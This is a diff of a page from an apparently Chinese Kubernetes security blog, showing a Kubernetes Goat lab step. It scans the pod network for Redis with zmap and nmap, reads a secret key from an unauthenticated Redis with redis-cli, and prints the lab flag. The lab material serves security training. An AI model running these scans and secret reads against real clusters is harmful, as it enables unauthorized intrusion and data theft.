+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2015.29.27.png" style="zoom:50%;">
+
+<p>注释掉10.0.0.0/8网段。</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2015.30.14.png" style="zoom:40%;">
+</blockquote>
+<p><strong>zmap</strong></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">zmap <span class="token parameter variable">-p</span> <span class="token number">6379</span> <span class="token number">10.244</span>.0.0/16 <span class="token parameter variable">-o</span> result.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2015.32.58.png" style="zoom:50%;">
+
+<p>这个错误提示说明 ZMap 无法自动检测到 IP 地址 <code>10.244.0.1</code>（可能是你的默认网关）对应的 MAC 地址。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp <span class="token parameter variable">-n</span> <span class="token number">10.244</span>.0.1 <span class="token comment">#查询网关mac地址</span>
+~ <span class="token comment"># arp -n 10.244.0.1</span>
+Address                  HWtype  HWaddress           Flags Mask            Iface
+<span class="token number">10.244</span>.0.1               ether   <span class="token number">22</span>:53:bf:42:b2:1d   C                     eth0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>再次运行zmap：</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2015.42.03.png" style="zoom:50%;">
+
+<p><strong>nmap</strong></p>
+<p>也可以用nmap扫描：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-p</span> <span class="token number">6379</span> <span class="token number">10.244</span>.0.0/16<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2015.45.08.png" style="zoom:50%;">
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2015.42.48.png" style="zoom:50%;">
+
+<ul>
+<li>攻击redis 6379端口读取敏感信息</li>
+</ul>
+<p>经过集群内网扫描发现10.244.0.5的6379端口开放，并且可以ping通。</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2015.49.32.png" style="zoom:40%;">
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">redis-cli <span class="token parameter variable">-h</span> <span class="token number">10.244</span>.0.5
+KEYS * <span class="token comment"># 列出所有键</span>
+GET SECRETSTUFF<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2015.51.39.png" style="zoom:40%;">
+
+<ul>
+<li>flag</li>
+</ul>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">k8s-goat-a5a3e446faafa9d0514b3ff396ab8a40<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 
                 
             </div>
@@ -2093,7 +2427,7 @@ ctr <span class="token parameter variable">-n</span> k8s.io containers list<span
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">368.7k</span>
+                        class="white-color">375.5k</span>
             
             
             
